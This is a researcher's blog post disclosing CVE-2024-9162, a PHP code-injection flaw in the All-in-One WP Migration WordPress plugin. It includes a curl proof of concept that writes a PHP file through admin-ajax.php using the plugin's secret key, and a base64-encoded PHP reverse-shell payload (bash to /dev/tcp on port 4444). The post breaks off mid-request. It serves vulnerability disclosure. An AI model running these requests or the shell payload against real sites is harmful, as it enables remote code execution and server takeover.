<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.d451ff92e80abc2a828eb9bb262e4db374bd4e954642f9245c54eec84bf690f3.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/images/favicon.ico>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">Ryan Kozak - All-in-One WP Migration and Backup &lt;= 7.86 - Authenticated (Administrator&#43;) Arbitrary PHP Code Injection</title>
<meta property="og:title" content=Ryan&#32;Kozak&#32;-&#32;All-in-One&#32;WP&#32;Migration&#32;and&#32;Backup&#32;&lt;&#61;&#32;7.86&#32;-&#32;Authenticated&#32;(Administrator&#43;)&#32;Arbitrary&#32;PHP&#32;Code&#32;Injection />
<meta name="twitter:title" content=Ryan&#32;Kozak&#32;-&#32;All-in-One&#32;WP&#32;Migration&#32;and&#32;Backup&#32;&lt;&#61;&#32;7.86&#32;-&#32;Authenticated&#32;(Administrator&#43;)&#32;Arbitrary&#32;PHP&#32;Code&#32;Injection />
<meta itemprop="name" content=Ryan&#32;Kozak&#32;-&#32;All-in-One&#32;WP&#32;Migration&#32;and&#32;Backup&#32;&lt;&#61;&#32;7.86&#32;-&#32;Authenticated&#32;(Administrator&#43;)&#32;Arbitrary&#32;PHP&#32;Code&#32;Injection />
<meta name="application-name" content=Ryan&#32;Kozak&#32;-&#32;All-in-One&#32;WP&#32;Migration&#32;and&#32;Backup&#32;&lt;&#61;&#32;7.86&#32;-&#32;Authenticated&#32;(Administrator&#43;)&#32;Arbitrary&#32;PHP&#32;Code&#32;Injection />
<meta property="og:site_name" content="" />


<meta name="description" content=CVE-2024-9162:&#32;WordPress&#32;All-in-One&#32;WP&#32;Migration&#32;plugin&#32;RCE&#32;vulnerability&#32;via&#32;PHP&#32;code&#32;injection.&#32;Includes&#32;exploit&#32;details. />



<base href="https://ryankozak.com/posts/cve-2024-9162/" />
<link rel="canonical" href="https://ryankozak.com/posts/cve-2024-9162/" itemprop="url" />
<meta name="url" content="https://ryankozak.com/posts/cve-2024-9162/" />
<meta name="twitter:url" content="https://ryankozak.com/posts/cve-2024-9162/" />
<meta property="og:url" content="https://ryankozak.com/posts/cve-2024-9162/" />


<meta property="og:updated_time" content="2024-10-27T05:18:12Z" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://ryankozak.com/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.152.2">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

    
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":  "Person",
  "@id":    "https://ryankozak.com/#ryan-kozak",
  "name":   "Ryan Kozak",
  "jobTitle": "Offensive Security Engineer - Security Researcher",
  "url":    "https://ryankozak.com",
  "image":  "https://ryankozak.com/images/ryan-kozak.jpg",
  "description": "Known hacker, cybersecurity researcher, former OWASP Sacramento Chapter lead, credited with multiple CVEs.",
  "sameAs": [
      "https://github.com/d0n601",
      "https://www.linkedin.com/in/ryan-kozak\/",
      "https://patchstack.com/database/researcher/ryan-kozak",
      "https://www.wordfence.com/threat-intel/vulnerabilities/researchers/ed9aaed9-ca13-413a-a5e3-af97095a4252",
      "https://stackoverflow.com/users/4681506/ryan-kozak"
  ],
  "knowsAbout": ["Hacking", "Red Teaming", "Offensive Security", "Penetration Testing", "Programming"]
}
</script> 
    <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "WebSite",
  "@id": "https://ryankozak.com/#website",
  "url": "https://ryankozak.com/",
  "name": "RyanKozak.com",
  "publisher": { "@id": "https://ryankozak.com/#ryan-kozak" },
}
</script>
    
    </head>

    <body class="">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://ryankozak.com/">
                <img src="/images/d0n601.jpg" alt="brand image">
            </a>
        
        
            <a href="https://ryankozak.com/">
                <h1>Ryan Kozak</h1>
            </a>
        
    </h1>
    <p class="lead">
    Hacking, CVEs, Development, and Other Things.
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about">About Me</a>
                    </li>
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Recent</a>
                    </li>
                    
                        <li class="sub-heading">
                            
                        </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13390/">WP Directory Kit &lt;= 1.4.4 - Authentication Bypass to Privilege Escalation via Account Takeover</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-12585/">MxChat – AI Chatbot for WordPress &lt;= 2.5.5 - Unauthenticated Information Exposure</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13597/">AI Feeds &lt;= 1.0.11 - Unauthenticated Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13595/">CIBELES AI &lt;= 1.10.8 - Unauthenticated Arbitrary File Upload</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://ryankozak.com/posts/cve-2025-13380/">AI Engine for WordPress: ChatGPT, GPT Content Generator &lt;= 1.0.1 - Authenticated (Contributor&#43;) Arbitrary File Read</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/d0n601">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>



    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/ryan-kozak/">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
        </svg>
    </a>















    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>


    <a target="_blank" class="social" title="Email" href="mailto:website@ryankozak.com">
       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
       </svg>
    </a>




        <p class="footnote">
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "TechArticle",
  "@id": "https:\/\/ryankozak.com\/posts\/cve-2024-9162\/#article",
  "headline": "\"All-in-One WP Migration and Backup \\u003c= 7.86 - Authenticated (Administrator+) Arbitrary PHP Code Injection\"",
  "author": { "@id": "" },
  "datePublished": "2024-10-27",
  "dateModified": "2024-10-27",
  "inLanguage": "en",
  "keywords": "[\"CVE\",\"WordPress\",\"All-in-One WP Migration\"]",
  "mainEntityOfPage": { "@type": "WebPage", "@id": "https:\/\/ryankozak.com\/posts\/cve-2024-9162\/" }
}
</script>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type":    "TechArticle",
  "headline": "\"All-in-One WP Migration and Backup \\u003c= 7.86 - Authenticated (Administrator+) Arbitrary PHP Code Injection\"",
  "datePublished": "2024-10-27",
  "dateModified":  "2024-10-27",
  "author":   { "@id": "https:\/\/ryankozak.com\/#ryan-kozak" },
  "publisher": {
    "@type": "Organization",
    "name":  "Ryan Kozak",
    "logo": {
      "@type": "ImageObject",
      "url": "\/images\/d0n601.png"
    }
  },
  "image": "null",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https:\/\/ryankozak.com\/posts\/cve-2024-9162\/"
  }
}
</script>
<div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://ryankozak.com/posts/cve-2024-9162/">All-in-One WP Migration and Backup &lt;= 7.86 - Authenticated (Administrator&#43;) Arbitrary PHP Code Injection</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2024-10-27T05:18:12Z" class="post-date">
        October 27, 2024
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>3 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-CVE">
        <a href="https://ryankozak.com/tags/cve">CVE</a>
      </li>
      
      <li class="tag-WordPress">
        <a href="https://ryankozak.com/tags/wordpress">WordPress</a>
      </li>
      
      <li class="tag-All-in-One WP Migration">
        <a href="https://ryankozak.com/tags/all-in-one-wp-migration">All-in-One WP Migration</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p>Around the time Def Con was happening this year I was sitting at home feeling left out. That made me feel hacky, but I don&rsquo;t get the same joy from CTFs at the moment that I used to. So, I decided to start hunting for CVEs. That lead to finding <a href="https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/all-in-one-wp-migration/all-in-one-wp-migration-and-backup-786-authenticated-administrator-arbitrary-php-code-injection" target="_blank">CVE-2024-9162</a>, which was just released today, along with the idea for a larger project that has resulted in a few more vulnerabilities yet to be disclosed.</p>
<h3 id="cve-2024-9162">CVE-2024-9162</h3>
<p>The <a href="https://wordpress.org/plugins/all-in-one-wp-migration/" target="_blank">All-in-One WP Migration plugin for WordPress</a> is vulnerable to arbitrary PHP Code Injection due to missing file type validation during the export in all versions up to, and including, 7.86. This makes it possible for authenticated attackers, with Administrator-level access and above, to create an export file with the .php extension on the affected site&rsquo;s server, adding an arbitrary PHP code to it, which may make remote code execution possible.</p>
<h3 id="tldr-exploits">TL;DR Exploits</h3>
<ul>
<li><a href="https://github.com/d0n601/CVE-2024-9162/blob/main/CVE-2024-9162.sh" target="_blank">CVE-2024-9162.sh</a></li>
<li><a href="https://github.com/d0n601/CVE-2024-9162/blob/main/CVE-2024-9162.py" target="_blank">CVE-2024-9162.py</a></li>
</ul>
<h3 id="details">Details</h3>
<p>The <code>ai1wm_secret_key</code> is a 12 character alphanumeric string created when the plugin is initialized. The key is <strong>never rotated</strong>, <strong>does not expire</strong>, and is <strong>stored plain text</strong> in the <code>wp_options</code> table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>mysql<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> option_name,option_value <span style="color:#66d9ef">FROM</span> wp_options <span style="color:#66d9ef">WHERE</span> option_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ai1wm_secret_key&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+--------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> option_name      <span style="color:#f92672">|</span> option_value <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+--------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">|</span> ai1wm_secret_key <span style="color:#f92672">|</span> PwrqqK3UHQJo <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------+--------------+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">row</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">00</span> sec)
</span></span></code></pre></div><h3 id="basic-proof-of-concept">Basic Proof of Concept:</h3>
<p>This will create a php file containing a call to <code>phpinfo();</code>, which can be replaced with a better payload as seen in the manual reproduction section. Notice there is no authorization required beyond the secret key parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>VICTIM_URL<span style="color:#f92672">=</span>https://wordpress.hacker
</span></span><span style="display:flex;"><span>XFILE_NAME<span style="color:#f92672">=</span>lolz.php
</span></span><span style="display:flex;"><span>XDIRECTORY_NAME<span style="color:#f92672">=</span>testauto
</span></span><span style="display:flex;"><span>SECRET_KEY<span style="color:#f92672">=</span>PwrqqK3UHQJo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIORITY_INT<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>
</span></span><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary $<span style="color:#e6db74">&#34;\x0d\x0a\x0d\x0a\x0d\x0aaction=ai1wm_export&amp;ai1wm_import=1&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=*&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=%3C%3Fphp+phpinfo()%3B+%3F%3E&amp;options%5Bencrypt_password%5D=&amp;options%5Bencrypt_password_confirmation%5D=&amp;options%5Bno_spam_comments%5D=on&amp;options%5Bno_post_revisions%5D=on&amp;options%5Bno_media%5D=on&amp;options%5Bno_themes%5D=on&amp;options%5Bno_muplugins%5D=on&amp;options%5Bno_plugins%5D=on&amp;options%5Bno_database%5D=on&amp;options%5Bno_email_replace%5D=on&amp;ai1wm_manual_export=1&amp;storage=</span>$XDIRECTORY_NAME<span style="color:#e6db74">&amp;file=1&amp;secret_key=</span>$SECRET_KEY<span style="color:#e6db74">&amp;priority=</span>$PRIORITY_INT<span style="color:#e6db74">&amp;archive=</span>$XFILE_NAME<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    $<span style="color:#e6db74">&#34;</span>$VICTIM_URL<span style="color:#e6db74">/wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIORITY_INT<span style="color:#f92672">=</span><span style="color:#ae81ff">50</span>
</span></span><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary $<span style="color:#e6db74">&#34;\x0d\x0a\x0d\x0a\x0d\x0aaction=ai1wm_export&amp;ai1wm_import=1&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=*&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=%3C%3Fphp+phpinfo()%3B+%3F%3E&amp;options%5Bencrypt_password%5D=&amp;options%5Bencrypt_password_confirmation%5D=&amp;options%5Bno_spam_comments%5D=on&amp;options%5Bno_post_revisions%5D=on&amp;options%5Bno_media%5D=on&amp;options%5Bno_themes%5D=on&amp;options%5Bno_muplugins%5D=on&amp;options%5Bno_plugins%5D=on&amp;options%5Bno_database%5D=on&amp;options%5Bno_email_replace%5D=on&amp;ai1wm_manual_export=1&amp;storage=</span>$XDIRECTORY_NAME<span style="color:#e6db74">&amp;file=1&amp;secret_key=</span>$SECRET_KEY<span style="color:#e6db74">&amp;priority=</span>$PRIORITY_INT<span style="color:#e6db74">&amp;archive=</span>$XFILE_NAME<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    $<span style="color:#e6db74">&#34;</span>$VICTIM_URL<span style="color:#e6db74">/wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIORITY_INT<span style="color:#f92672">=</span><span style="color:#ae81ff">60</span>
</span></span><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    --data-binary $<span style="color:#e6db74">&#34;\x0d\x0a\x0d\x0a\x0d\x0aaction=ai1wm_export&amp;ai1wm_import=1&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bold_value%5D%5B%5D=*&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=&amp;options%5Breplace%5D%5Bnew_value%5D%5B%5D=%3C%3Fphp+phpinfo()%3B+%3F%3E&amp;options%5Bencrypt_password%5D=&amp;options%5Bencrypt_password_confirmation%5D=&amp;options%5Bno_spam_comments%5D=on&amp;options%5Bno_post_revisions%5D=on&amp;options%5Bno_media%5D=on&amp;options%5Bno_themes%5D=on&amp;options%5Bno_muplugins%5D=on&amp;options%5Bno_plugins%5D=on&amp;options%5Bno_database%5D=on&amp;options%5Bno_email_replace%5D=on&amp;ai1wm_manual_export=1&amp;storage=</span>$XDIRECTORY_NAME<span style="color:#e6db74">&amp;file=1&amp;secret_key=</span>$SECRET_KEY<span style="color:#e6db74">&amp;priority=</span>$PRIORITY_INT<span style="color:#e6db74">&amp;archive=</span>$XFILE_NAME<span style="color:#e6db74">&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    $<span style="color:#e6db74">&#34;</span>$VICTIM_URL<span style="color:#e6db74">/wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1&#34;</span>
</span></span></code></pre></div><p><img src="/posts/images/CVE-2024-9162/1.png" alt="Screenshot from 2024-08-13 15-36-42"></p>
<h3 id="manually-to-reproduce">Manually To Reproduce:</h3>
<p>It should be noted that the <code>php</code> file created via these steps will first appear in <code>wp-content/plugins/all-in-one-wp-migration/storage/EXPLOITDIR/EXPLOITFILE.php</code> before being deleted by the script and moved to <code>wp-content/ai1wm-backups/reverse_shell.php</code>.</p>
<ul>
<li>
<p>Log in, Click all in one WP migration export to access the &ldquo;Export Site&rdquo; <a href="https://wordpress.hacker/wp-admin/admin.php?page=ai1wm_export" target="_blank">page</a>.</p>
<ul>
<li><img src="/posts/images/CVE-2024-9162/2.png" alt="Screenshot from 2024-08-12 15-40-48"></li>
</ul>
</li>
<li>
<p>In the <strong>Find * Replace with</strong> <code>&lt;another-text&gt;</code> <strong>in the database</strong>.</p>
</li>
<li>
<p>Input <code>*</code> into the <em>Find</em> box.</p>
</li>
<li>
<p>Input your crafted php payload into  into the <em>Replae With</em> box (<code>phpinfo();</code>, web shell, etc).</p>
<ul>
<li>Reverse Shell Example:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">eval</span>( <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#39;ZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4gL2Rldi90Y3AvMTkyLjE2OC4xMDAuODYvNDQ0NCAwPiYxJyAiKTs=&#39;</span>)); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>This will decode to</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt; /dev/tcp/192.168.100.86/4444 0&gt;&amp;1&#39; &#34;</span>);
</span></span></code></pre></div></li>
<li>
<p><img src="/posts/images/CVE-2024-9162/3.png" alt="Screenshot from 2024-08-12 15-38-01"></p>
</li>
<li>
<p>Setup Burp or similar tool and begin to proxy the traffic, then click the green &ldquo;Export To -&gt; File&rdquo; option.</p>
<ul>
<li><img src="/posts/images/CVE-2024-9162/4.png" alt="Screenshot from 2024-08-12 15-42-30"></li>
<li><img src="/posts/images/CVE-2024-9162/5.png" alt="Screenshot from 2024-08-12 15-39-38"></li>
</ul>
</li>
<li>
<p>Forward the first request: <code>POST /wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1 HTTP/1.1</code>, without manipulation.</p>
</li>
<li>
<p>Forward: <code>GET /wp-admin/admin-ajax.php?action=ai1wm_status&amp;ai1wm_import=1&amp;secret_key=OYXj1AIdQUnc&amp;_=1723495770325 HTTP/2</code>.</p>
</li>
<li>
<p>Intercepting the request to <code>POST /wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1 HTTP/2</code></p>
<ul>
<li>Modify the <code>archive</code> parameter to whatever name you like, and the <code>.php</code> extension, and then forward the request.</li>
<li>
<pre tabindex="0"><code>  POST /wp-admin/admin-ajax.php?action=ai1wm_export&amp;ai1wm_import=1 HTTP/2
  Host: wordpress.hacker
